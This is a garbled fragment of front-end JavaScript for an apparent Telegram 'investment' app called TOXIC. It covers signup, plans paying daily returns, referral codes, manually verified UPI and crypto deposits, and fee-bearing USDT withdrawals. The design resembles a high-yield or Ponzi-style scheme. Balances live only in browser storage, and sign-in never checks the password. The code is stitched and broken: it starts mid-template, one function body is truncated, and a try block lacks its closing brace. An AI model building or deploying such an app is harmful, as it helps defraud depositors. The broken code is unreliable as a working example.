function selMethod(i) {

  const data = i === 0 ? encodeURIComponent('upi://pay?pa='+CONFIG.upi+'&pn='+CONFIG.upiName+'&cu=INR') : addrs[i];

}

              <div class="level-box py-6"><p class="text-2xl mb-2 opacity-40">👤</p><p class="text-xs text-gray-600">No users</p></div>
            </div>
          `).join('')}
        </div>
      </div>
      <button onclick="copyText('${refLink}')" class="w-full py-4 rounded-2xl flex items-center justify-between px-5 btn-green glow-green">
        <div class="flex items-center gap-3">
          <span class="text-2xl">🔗</span>
          <div class="text-left">
            <p class="font-black text-sm">INVITE FRIENDS</p>
            <p class="text-[10px] opacity-70">Share your link and grow your network</p>
          </div>
        </div>
        <span class="text-xl">›</span>
      </button>
    </div>`;
}

function statCard(icon, label, value, unit) {
  return `<div class="glass-card">
    <div class="w-10 h-10 rounded-xl flex items-center justify-center mb-3" style="background:rgba(0,255,102,0.08); border:1px solid rgba(0,255,102,0.15);">${icon}</div>
    <p class="text-[9px] text-gray-500 tracking-wider font-bold mb-2">${label}</p>
    <p class="mono text-2xl font-black text-white">${value}</p>
    <p class="text-[10px] text-gray-600 mt-1">${unit}</p>
  </div>`;
}

// ==================== ACTIONS ====================
function goSignup(){ S.tab='signup'; S.signupStep=1; render(); }
function goSignin(){ S.tab='signin'; render(); }
function saveCountry(v){ S.signupData.country = v; }

function nextStep(n) {
  if (n === 2) {
    if (!S.signupData.country && $('countrySel')) S.signupData.country = $('countrySel').value;
    if (!S.signupData.country) return alert('Please select a country');
  }
  if (n === 3) {
    S.signupData.firstName = $('fn').value;
    S.signupData.lastName = $('ln').value;
    S.signupData.email = $('em').value;
    S.signupData.phone = $('ph').value;
    if (!S.signupData.firstName || !S.signupData.email) return alert('Please fill Name and Email');
  }
  S.signupStep = n;
  render();
}

function finishSignup() {
  const un = $('un').value.trim();
  const pw = $('pw').value;
  const pw2 = $('pw2').value;
  if (!un || un.length < 6) return alert('Username must be 6+ characters');
  if (!pw || pw.length < 8) return alert('Password must be 8+ characters');
  if (pw !== pw2) return alert('Passwords do not match');
  S.signupData.username = un;
  createUser(un);
}

function createUser(username) {
  S.user = {
    id: 'TG' + Date.now(),
    username: username,
    balance: 0,
    referralBalance: 0,
    activated: 0,
    earned: 0,
    ceiling: 0,
    invested: 0,
    activePlans: [],
    referralCode: 'TOXIC' + Math.floor(1000 + Math.random()*9000),
    joined: new Date().toISOString()
  };
  S.tab = 'dashboard';
  S.signupStep = 1;
  save(); render();
}

function doSignIn() {
  const u = $('signinUser').value.trim();
  const p = $('signinPass').value;
  if (!u || !p) return alert('Enter username and password');
  const existing = JSON.parse(localStorage.getItem('toxic_user') || 'null');
  if (existing && existing.username === u) { S.user = existing; }
  else { createUser(u); }
  S.tab = 'dashboard';
  save(); render();
}

function doLogout() {
  if (!confirm('Logout from TOXIC?')) return;
  localStorage.removeItem('toxic_user');
  S.user = null;
  S.tab = 'signin';
  render();
}

function invest(id) {
  const p = PLANS.find(x => x.id === id);
  if (!p) return;
  if (S.user.balance < p.deposit) return alert('Insufficient balance. Please deposit first.');
  S.user.balance -= p.deposit;
  S.user.invested += p.deposit;
  S.user.activated += p.deposit;
  S.user.ceiling = S.user.activated * 2;
  if (!S.user.activePlans) S.user.activePlans = [];
  S.user.activePlans.push({ ...p, daysCollected: 0, started: Date.now() });
  save(); render();
  alert(`✅ Invested $${p.deposit} in ${p.name}!\nDaily: $${p.daily}`);
}

function submitDeposit() {
  const amt = parseFloat($('depAmt').value);
  const isCrypto = selM !== 0;
  const utr = $('depUtr') ? $('depUtr').value.trim() : '';
  const tx = $('depTx') ? $('depTx').value.trim() : '';
  const ref = isCrypto ? tx : utr;
  if (!amt || amt < CONFIG.minDeposit) return alert(`Minimum deposit is $${CONFIG.minDeposit}`);
  if (isCrypto && !ref) return alert('Please enter TxHash');
  if (!isCrypto && utr.length !== 12) return alert('Enter valid 12-digit UTR');
  S.transactions.push({
    id: Date.now(), type: 'deposit', amount: amt,
    utr: !isCrypto ? utr : '', ref: ref,
    status: 'pending', method: ['UPI','USDT BEP20','USDT TRC20','BTC BEP20'][selM],
    user: S.user.id, date: new Date().toISOString()
  });
  save();
  $('depAmt').value = '';
  if ($('depUtr')) $('depUtr').value = '';
  if ($('depTx')) $('depTx').value = '';
  alert('✅ Deposit submitted!\n\nYour payment will be verified manually. Balance will be credited within 24 hours.');
}

function submitWithdraw() {
  const amt = parseFloat($('wdAmt').value);
  const addr = $('wdAddr').value.trim();
  if (!amt || amt < CONFIG.minWithdraw) return alert(`Minimum withdrawal is $${CONFIG.minWithdraw}`);
  if (!addr) return alert('Enter USDT address');
  if (S.user.balance < amt) return alert('Insufficient balance');
  const fee = amt * CONFIG.withdrawFee;
  S.user.balance -= amt;
  S.transactions.push({
    id: Date.now(), type: 'withdrawal', amount: amt - fee, fee,
    address: addr, status: 'pending', method: 'USDT', user: S.user.id,
    date: new Date().toISOString()
  });
  save(); render();
  alert(`✅ Withdrawal requested!\n\nAmount: $${fmt(amt)}\nFee (5%): $${fmt(fee)}\nYou'll receive: $${fmt(amt - fee)}`);
}

function copyText(text) {
  navigator.clipboard.writeText(text).then(() => { alert('✅ Copied to clipboard!'); })
  .catch(() => {
    const el = document.createElement('textarea');
    el.value = text; document.body.appendChild(el); el.select();
    document.execCommand('copy'); document.body.removeChild(el);
    alert('✅ Copied!');
  });
}

try {
  if (window.Telegram?.WebApp) {
    window.Telegram.WebApp.ready();

} catch(e){ console.log('TG not available'); }

if (!S.user) S.tab = 'signup';
render();
